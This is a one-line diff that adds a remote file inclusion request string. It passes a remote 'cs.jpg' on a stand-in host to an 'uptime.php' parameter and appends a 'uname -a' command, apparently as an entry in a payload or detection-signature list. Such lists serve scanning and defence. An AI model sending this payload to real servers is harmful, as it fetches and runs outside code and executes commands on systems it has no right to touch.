@@ -1,0 +1,1 @@
+/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a
